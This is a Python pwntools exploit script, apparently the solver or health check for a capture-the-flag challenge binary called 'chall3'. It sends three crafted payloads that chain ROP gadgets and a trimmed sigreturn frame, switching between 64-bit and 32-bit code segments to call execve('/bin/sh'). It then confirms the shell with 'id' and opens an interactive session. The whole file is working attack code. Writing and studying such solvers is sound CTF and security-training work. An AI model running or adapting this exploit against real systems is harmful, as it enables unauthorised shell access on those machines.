#!/usr/bin/env python3
from pwn import *
import sys
import os

NUM_ATTEMPTS = 1000

HOST = ''
PORT = 40003

context(arch='amd64', os='linux')

target_elf = ELF('../bin/chall3')

GADGET_ESP_EBX_INT_RET = next(target_elf.search(bytes.fromhex('89dc37cd80'))) # xchg esp, ebx; aaa; int 0x80; retf
GADGET_INT_RET         = GADGET_ESP_EBX_INT_RET + 3 # int 0x80; retf
ADDR_RESTART           = target_elf.start
GADGET_SYSCALL         = next(target_elf.search(bytes.fromhex('0f05'))) # syscall

if len(sys.argv) > 1:
	HOST = sys.argv[1]

if len(sys.argv) > 2:
	PORT = int(sys.argv[2])

def exploit_attempt():
	try:
		if HOST == '':
			io = target_elf.process(level='warn')
		else:
			io = remote(HOST, PORT, level='warn')

		canary  = p32(ADDR_RESTART) # restart app
		canary += p32(0x33)         # cs in x64

		io.recvline()
		io.send(canary)
		io.recvline()

		context.clear(arch="i386")
		x32     = SigreturnFrame(kernel='i386')
		x32.eax = 0x0000000b        # SYS_execve
		x32.ebx = target_elf.bss(0) # /bin/sh
		x32.edx = 0x00
		x32.ebp = target_elf.get_section_by_name('.data').header.sh_addr + 0x200
		x32.esp = target_elf.bss(0)
		x32.eip = GADGET_INT_RET    
		x32.cs  = 0x23
		x32.ss  = 0x2b

		payload1  = cyclic(32)
		payload1 += canary
		payload1 += p64(GADGET_ESP_EBX_INT_RET)
		payload1 += cyclic(4)       # eax will end up as 4 (SYS_write on x32)

		io.send(payload1)
		io.recvline()
		io.send(canary)
		io.recvline()

		payload2  = cyclic(32)
		payload2 += p32(GADGET_SYSCALL) # restart app
		payload2 += p32(0x33)           # cs in x64
		payload2 += p64(GADGET_INT_RET)
		payload2 += b'A'*8
		payload2 += p32(ADDR_RESTART)   # restart app
		payload2 += p32(0x33)           # cs in x64
		payload2 += cyclic(79)
		payload2 += bytes(x32)[-17:]    # srop frame (the tail of the trimmed srop frame)
		payload2 += b'\x00'*(0x100-len(payload2))

		io.send(payload2)
		io.recvline()
		io.send(canary)
		io.recvline()

		payload3  = b'B'*8              # padding
		payload3 += b'/bin/sh\x00'      # canary
		payload3 += b'C'*16             # padding
		payload3 += b'/bin/sh\x00'      # canary
		payload3 += p64(GADGET_INT_RET) # int 0x80; retf
		payload3 += b'D'*8              # padding
		payload3 += bytes(x32)[:-17]    # trim srop frame to fit (kills ss)

		io.send(payload3)

		io.sendline(b'id')
		id_result = io.recvline()
		if b'uid=' in id_result:
			log.success('shell: %s', id_result.decode('ascii').strip())
			if not os.environ.get('HEALTH_CHECK', False):
				io.interactive()
			return True
		else:
			log.failure('Error: %s', id_result)
	except EOFError as e:
		log.failure('Fail: EOF')
	except Exception as e:
		log.failure('Error: %s: %s', type(e), str(e))
	finally:
		io.close()
	return False


if __name__ == '__main__':
	for _ in range(NUM_ATTEMPTS):
		if exploit_attempt():
			sys.exit(0)
		sleep(0.1)
	sys.exit(1)